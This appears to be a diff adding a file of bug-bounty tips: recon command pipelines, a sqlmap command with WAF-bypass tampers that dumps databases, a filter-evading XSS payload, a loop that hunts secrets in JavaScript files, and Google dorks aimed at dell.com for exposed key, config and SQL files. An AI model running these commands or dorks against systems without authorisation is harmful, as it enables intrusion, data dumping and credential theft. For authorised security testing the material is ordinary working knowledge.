@@ -1,0 +1,42 @@
+Hii Bug Hunter's
+Today I Found 7x SQLI
+10x XSS
+Tips:
+waymore -i $domain -mode U -oU ./waymoreUrls.txt -url-filename -p 4
+echo $domain | (gauplus || hakrawler) | grep -Ev "\.(jpeg|jpg|png|ico|woff|svg|css|ico|woff|ttf)$" > ./gaukrawler.txt
+cat ./waymoreUrls.txt ./gaukrawler.txt | sort -u | uro | gf endpoints > allUrls.txt
+
+To Bypass WAF
+sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
+-----------------------------------------------------------------------------------------------------------------------------------------
+Hi Bug Hunters 
+How to find RXSS in 5 minutes 
+1) subfinder -d target.com -all -o targets.txt *use subfinder with API Keys to extract a lot subdomains*
+2) paramspider -l targets.txt 
+3) cat *.txt | kxss
+4) Use this Payload to Bypass case sensitive %27"></a><​/script></title></form></span><​/meta><​/style></iframe></noscript></textarea></xmp></pre><​ScRiPt>alert(/hacked%20By%20Ahmad/)<​/sCrIpT> 
+5) Happy Hunting 😍
+-----------------------------------------------------------------------------------------------------------------------------------------
+How I found Administrator Credentials?
+
+- First Gather all the all the subdomain
+- 2nd Use katana : katana -u target.txt -o target1.txt or use web crawling other tools
+- cat target1.txt | grep js | tee target2.txt
+- cat target2.txt | while read url; do python3 SecretFinder.py -i $url -o cli; done
+-----------------------------------------------------------------------------------------------------------------------------------------
+waybackurls TARGET.com | httpx -status-code : https://offsec01.medium.com/critical-misconfiguration-in-firebase-e682ec4239d6
+-----------------------------------------------------------------------------------------------------------------------------------------
+site:*dell.com (ext:env OR ext:json OR ext:xml OR ext:sql OR ext:bak OR ext:log OR ext:key OR ext:crt OR ext:pem)
+
+site:*.dell.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+I hate recon but here a good tip :
+
+1 - Get the company IPs range X.X.X.X/24
+2 - Run nmap -p 80,448,8080 IP/24 -oN file.txt 
+3 - Use any IP extractor or API in case of automation or bash then save it on IPs.txt
+4- run httpx -l IPs.txt -o final.txt
+5 - run nuclei -l final.txt
+-----------------------------------------------------------------------------------------------------------------------------------------
+
